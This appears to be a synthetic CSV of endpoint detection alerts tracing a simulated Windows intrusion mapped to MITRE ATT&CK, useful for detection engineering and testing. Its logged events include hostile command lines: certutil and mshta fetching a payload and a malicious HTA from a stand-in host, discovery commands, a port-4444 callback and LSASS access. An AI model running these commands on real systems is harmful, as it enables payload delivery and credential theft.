timestamp,rule_id,rule_name,severity,mitre_technique,mitre_tactic,computer,event_id,matched_fields,raw_event
2026-04-03T14:22:10.123456700Z,PROC-001,Suspicious PowerShell Encoded Command,high,T1059.001,Execution,WORKSTATION-01,1,"{""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""CommandLine"": ""powershell.exe -EncodedCommand dABlAHMAdAAtAGMAbwBuAG4AZQBjAHQAaQBvAG4AIABnAG8AbwBnAGwAZQAuAGMAbwBtAA==""}","{""EventID"": 1, ""Timestamp"": ""2026-04-03T14:22:10.123456700Z"", ""Computer"": ""WORKSTATION-01"", ""RuleName"": ""-"", ""UtcTime"": ""2026-04-03 14:22:10.123"", ""ProcessGuid"": ""{11111111-1111-1111-1111-111111111101}"", ""ProcessId"": ""4892"", ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""FileVersion"": ""10.0.19041.1"", ""Description"": ""Windows PowerShell"", ""Product"": ""Microsoft Windows Operating System"", ""Company"": ""Microsoft Corporation"", ""OriginalFileName"": ""PowerShell.EXE"", ""CommandLine"": ""powershell.exe -EncodedCommand dABlAHMAdAAtAGMAbwBuAG4AZQBjAHQAaQBvAG4AIABnAG8AbwBnAGwAZQAuAGMAbwBtAA=="", ""CurrentDirectory"": ""C:\\Users\\jsmith\\"", ""User"": ""WORKSTATION-01\\jsmith"", ""LogonGuid"": ""{11111111-1111-1111-1111-111111110000}"", ""LogonId"": ""0x3e7"", ""TerminalSessionId"": ""1"", ""IntegrityLevel"": ""High"", ""Hashes"": ""SHA256=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"", ""ParentProcessGuid"": ""{11111111-1111-1111-1111-111111111000}"", ""ParentProcessId"": ""3200"", ""ParentImage"": ""C:\\Windows\\explorer.exe"", ""ParentCommandLine"": ""C:\\Windows\\explorer.exe"", ""ParentUser"": ""WORKSTATION-01\\jsmith"", ""ancestors"": []}"
2026-04-03T14:22:15.234567800Z,PROC-002,Office Application Spawning Command Shell,high,T1059.003,Execution,WORKSTATION-01,1,"{""ParentImage"": ""C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"", ""Image"": ""C:\\Windows\\System32\\cmd.exe""}","{""EventID"": 1, ""Timestamp"": ""2026-04-03T14:22:15.234567800Z"", ""Computer"": ""WORKSTATION-01"", ""RuleName"": ""-"", ""UtcTime"": ""2026-04-03 14:22:15.234"", ""ProcessGuid"": ""{11111111-1111-1111-1111-111111111102}"", ""ProcessId"": ""5120"", ""Image"": ""C:\\Windows\\System32\\cmd.exe"", ""FileVersion"": ""10.0.19041.1"", ""Description"": ""Windows Command Processor"", ""Product"": ""Microsoft Windows Operating System"", ""Company"": ""Microsoft Corporation"", ""OriginalFileName"": ""Cmd.Exe"", ""CommandLine"": ""cmd.exe /c whoami & ipconfig /all"", ""CurrentDirectory"": ""C:\\Users\\jsmith\\Documents\\"", ""User"": ""WORKSTATION-01\\jsmith"", ""LogonGuid"": ""{11111111-1111-1111-1111-111111110000}"", ""LogonId"": ""0x3e7"", ""TerminalSessionId"": ""1"", ""IntegrityLevel"": ""Medium"", ""Hashes"": ""SHA256=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"", ""ParentProcessGuid"": ""{11111111-1111-1111-1111-111111111010}"", ""ParentProcessId"": ""2744"", ""ParentImage"": ""C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"", ""ParentCommandLine"": ""\""C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\"" /n \""C:\\Users\\jsmith\\Documents\\invoice.docm\"""", ""ParentUser"": ""WORKSTATION-01\\jsmith"", ""ancestors"": []}"
2026-04-03T14:22:20.345678900Z,PROC-003,Net User Enumeration,medium,T1087.001,Discovery,WORKSTATION-01,1,"{""Image"": ""C:\\Windows\\System32\\net.exe"", ""CommandLine"": ""net user /domain""}","{""EventID"": 1, ""Timestamp"": ""2026-04-03T14:22:20.345678900Z"", ""Computer"": ""WORKSTATION-01"", ""RuleName"": ""-"", ""UtcTime"": ""2026-04-03 14:22:20.345"", ""ProcessGuid"": ""{11111111-1111-1111-1111-111111111103}"", ""ProcessId"": ""6044"", ""Image"": ""C:\\Windows\\System32\\net.exe"", ""FileVersion"": ""10.0.19041.1"", ""Description"": ""Net Command"", ""Product"": ""Microsoft Windows Operating System"", ""Company"": ""Microsoft Corporation"", ""OriginalFileName"": ""net.exe"", ""CommandLine"": ""net user /domain"", ""CurrentDirectory"": ""C:\\Windows\\System32\\"", ""User"": ""WORKSTATION-01\\jsmith"", ""LogonGuid"": ""{11111111-1111-1111-1111-111111110000}"", ""LogonId"": ""0x3e7"", ""TerminalSessionId"": ""1"", ""IntegrityLevel"": ""Medium"", ""Hashes"": ""SHA256=CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"", ""ParentProcessGuid"": ""{11111111-1111-1111-1111-111111111102}"", ""ParentProcessId"": ""5120"", ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"", ""ParentCommandLine"": ""cmd.exe /c whoami & ipconfig /all"", ""ParentUser"": ""WORKSTATION-01\\jsmith"", ""ancestors"": [{""pid"": ""5120"", ""image"": ""C:\\Windows\\System32\\cmd.exe"", ""command_line"": ""cmd.exe /c whoami & ipconfig /all""}]}"
2026-04-03T14:22:22.456789100Z,PROC-004,Whoami Execution,low,T1033,Discovery,WORKSTATION-01,1,"{""Image"": ""C:\\Windows\\System32\\whoami.exe""}","{""EventID"": 1, ""Timestamp"": ""2026-04-03T14:22:22.456789100Z"", ""Computer"": ""WORKSTATION-01"", ""RuleName"": ""-"", ""UtcTime"": ""2026-04-03 14:22:22.456"", ""ProcessGuid"": ""{11111111-1111-1111-1111-111111111104}"", ""ProcessId"": ""6200"", ""Image"": ""C:\\Windows\\System32\\whoami.exe"", ""FileVersion"": ""10.0.19041.1"", ""Description"": ""whoami - displays logged on user information"", ""Product"": ""Microsoft Windows Operating System"", ""Company"": ""Microsoft Corporation"", ""OriginalFileName"": ""whoami.exe"", ""CommandLine"": ""whoami /all"", ""CurrentDirectory"": ""C:\\Windows\\System32\\"", ""User"": ""WORKSTATION-01\\jsmith"", ""LogonGuid"": ""{11111111-1111-1111-1111-111111110000}"", ""LogonId"": ""0x3e7"", ""TerminalSessionId"": ""1"", ""IntegrityLevel"": ""Medium"", ""Hashes"": ""SHA256=DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD"", ""ParentProcessGuid"": ""{11111111-1111-1111-1111-111111111102}"", ""ParentProcessId"": ""5120"", ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"", ""ParentCommandLine"": ""cmd.exe /c whoami & ipconfig /all"", ""ParentUser"": ""WORKSTATION-01\\jsmith"", ""ancestors"": [{""pid"": ""5120"", ""image"": ""C:\\Windows\\System32\\cmd.exe"", ""command_line"": ""cmd.exe /c whoami & ipconfig /all""}]}"
2026-04-03T14:22:30.567890200Z,PROC-005,Certutil Used for File Download or Encoding,high,T1105,Command and Control,WORKSTATION-01,1,"{""Image"": ""C:\\Windows\\System32\\certutil.exe"", ""CommandLine"": ""certutil.exe -urlcache -split -f http://192.168.100.50/payload.exe C:\\Users\\Public\\payload.exe""}","{""EventID"": 1, ""Timestamp"": ""2026-04-03T14:22:30.567890200Z"", ""Computer"": ""WORKSTATION-01"", ""RuleName"": ""-"", ""UtcTime"": ""2026-04-03 14:22:30.567"", ""ProcessGuid"": ""{11111111-1111-1111-1111-111111111105}"", ""ProcessId"": ""6800"", ""Image"": ""C:\\Windows\\System32\\certutil.exe"", ""FileVersion"": ""10.0.19041.1"", ""Description"": ""CertUtil.exe"", ""Product"": ""Microsoft Windows Operating System"", ""Company"": ""Microsoft Corporation"", ""OriginalFileName"": ""CertUtil.exe"", ""CommandLine"": ""certutil.exe -urlcache -split -f http://192.168.100.50/payload.exe C:\\Users\\Public\\payload.exe"", ""CurrentDirectory"": ""C:\\Windows\\System32\\"", ""User"": ""WORKSTATION-01\\jsmith"", ""LogonGuid"": ""{11111111-1111-1111-1111-111111110000}"", ""LogonId"": ""0x3e7"", ""TerminalSessionId"": ""1"", ""IntegrityLevel"": ""High"", ""Hashes"": ""SHA256=EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"", ""ParentProcessGuid"": ""{11111111-1111-1111-1111-111111111102}"", ""ParentProcessId"": ""5120"", ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"", ""ParentCommandLine"": ""cmd.exe /c certutil -urlcache -split -f http://192.168.100.50/payload.exe"", ""ParentUser"": ""WORKSTATION-01\\jsmith"", ""ancestors"": [{""pid"": ""5120"", ""image"": ""C:\\Windows\\System32\\cmd.exe"", ""command_line"": ""cmd.exe /c whoami & ipconfig /all""}]}"
2026-04-03T14:22:35.678901300Z,PROC-006,MSHTA Execution,high,T1218.005,Defense Evasion,WORKSTATION-01,1,"{""Image"": ""C:\\Windows\\System32\\mshta.exe""}","{""EventID"": 1, ""Timestamp"": ""2026-04-03T14:22:35.678901300Z"", ""Computer"": ""WORKSTATION-01"", ""RuleName"": ""-"", ""UtcTime"": ""2026-04-03 14:22:35.678"", ""ProcessGuid"": ""{11111111-1111-1111-1111-111111111106}"", ""ProcessId"": ""7040"", ""Image"": ""C:\\Windows\\System32\\mshta.exe"", ""FileVersion"": ""11.0.19041.1"", ""Description"": ""Microsoft (R) HTML Application host"", ""Product"": ""Internet Explorer"", ""Company"": ""Microsoft Corporation"", ""OriginalFileName"": ""MSHTA.EXE"", ""CommandLine"": ""mshta.exe http://192.168.100.50/malicious.hta"", ""CurrentDirectory"": ""C:\\Users\\jsmith\\Downloads\\"", ""User"": ""WORKSTATION-01\\jsmith"", ""LogonGuid"": ""{11111111-1111-1111-1111-111111110000}"", ""LogonId"": ""0x3e7"", ""TerminalSessionId"": ""1"", ""IntegrityLevel"": ""Medium"", ""Hashes"": ""SHA256=FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"", ""ParentProcessGuid"": ""{11111111-1111-1111-1111-111111111000}"", ""ParentProcessId"": ""3200"", ""ParentImage"": ""C:\\Windows\\explorer.exe"", ""ParentCommandLine"": ""C:\\Windows\\explorer.exe"", ""ParentUser"": ""WORKSTATION-01\\jsmith"", ""ancestors"": []}"
2026-04-03T14:23:05.234567800Z,NET-002,Connection to IP Address Without Hostname,medium,T1071.004,Command and Control,WORKSTATION-01,3,"{""DestinationHostname"": """"}","{""EventID"": 3, ""Timestamp"": ""2026-04-03T14:23:05.234567800Z"", ""Computer"": ""WORKSTATION-01"", ""RuleName"": ""-"", ""UtcTime"": ""2026-04-03 14:23:05.234"", ""ProcessGuid"": ""{11111111-1111-1111-1111-111111111120}"", ""ProcessId"": ""8100"", ""Image"": ""C:\\Windows\\System32\\wscript.exe"", ""User"": ""WORKSTATION-01\\jsmith"", ""Protocol"": ""tcp"", ""Initiated"": ""true"", ""SourceIsIpv6"": ""false"", ""SourceIp"": ""10.0.0.15"", ""SourceHostname"": ""WORKSTATION-01"", ""SourcePort"": ""49876"", ""SourcePortName"": ""-"", ""DestinationIsIpv6"": ""false"", ""DestinationIp"": ""10.10.10.99"", ""DestinationHostname"": """", ""DestinationPort"": ""4444"", ""DestinationPortName"": ""-"", ""ancestors"": []}"
2026-04-03T14:23:05.234567800Z,NET-003,Scripting Host Network Connection,high,T1059.005,Execution,WORKSTATION-01,3,"{""Image"": ""C:\\Windows\\System32\\wscript.exe""}","{""EventID"": 3, ""Timestamp"": ""2026-04-03T14:23:05.234567800Z"", ""Computer"": ""WORKSTATION-01"", ""RuleName"": ""-"", ""UtcTime"": ""2026-04-03 14:23:05.234"", ""ProcessGuid"": ""{11111111-1111-1111-1111-111111111120}"", ""ProcessId"": ""8100"", ""Image"": ""C:\\Windows\\System32\\wscript.exe"", ""User"": ""WORKSTATION-01\\jsmith"", ""Protocol"": ""tcp"", ""Initiated"": ""true"", ""SourceIsIpv6"": ""false"", ""SourceIp"": ""10.0.0.15"", ""SourceHostname"": ""WORKSTATION-01"", ""SourcePort"": ""49876"", ""SourcePortName"": ""-"", ""DestinationIsIpv6"": ""false"", ""DestinationIp"": ""10.10.10.99"", ""DestinationHostname"": """", ""DestinationPort"": ""4444"", ""DestinationPortName"": ""-"", ""ancestors"": []}"
2026-04-03T14:23:20.567890200Z,PA-001,LSASS Memory Access,critical,T1003.001,Credential Access,WORKSTATION-01,10,"{""TargetImage"": ""C:\\Windows\\System32\\lsass.exe""}","{""EventID"": 10, ""Timestamp"": ""2026-04-03T14:23:20.567890200Z"", ""Computer"": ""WORKSTATION-01"", ""RuleName"": ""-"", ""UtcTime"": ""2026-04-03 14:23:20.567"", ""SourceProcessGUID"": ""{11111111-1111-1111-1111-111111111101}"", ""SourceProcessId"": ""4892"", ""SourceThreadId"": ""5012"", ""SourceImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""TargetProcessGUID"": ""{11111111-1111-1111-1111-111111110010}"", ""TargetProcessId"": ""660"", ""TargetImage"": ""C:\\Windows\\System32\\lsass.exe"", ""GrantedAccess"": ""0x1010"", ""CallTrace"": ""C:\\Windows\\SYSTEM32\\ntdll.dll+9d4b4|C:\\Windows\\System32\\KERNELBASE.dll+12e93|UNKNOWN(00007FFB12345678)"", ""ancestors"": []}"
2026-04-03T14:23:20.567890200Z,PA-002,Suspicious Access Mask on LSASS,critical,T1003.001,Credential Access,WORKSTATION-01,10,"{""TargetImage"": ""C:\\Windows\\System32\\lsass.exe"", ""GrantedAccess"": ""0x1010""}","{""EventID"": 10, ""Timestamp"": ""2026-04-03T14:23:20.567890200Z"", ""Computer"": ""WORKSTATION-01"", ""RuleName"": ""-"", ""UtcTime"": ""2026-04-03 14:23:20.567"", ""SourceProcessGUID"": ""{11111111-1111-1111-1111-111111111101}"", ""SourceProcessId"": ""4892"", ""SourceThreadId"": ""5012"", ""SourceImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""TargetProcessGUID"": ""{11111111-1111-1111-1111-111111110010}"", ""TargetProcessId"": ""660"", ""TargetImage"": ""C:\\Windows\\System32\\lsass.exe"", ""GrantedAccess"": ""0x1010"", ""CallTrace"": ""C:\\Windows\\SYSTEM32\\ntdll.dll+9d4b4|C:\\Windows\\System32\\KERNELBASE.dll+12e93|UNKNOWN(00007FFB12345678)"", ""ancestors"": []}"
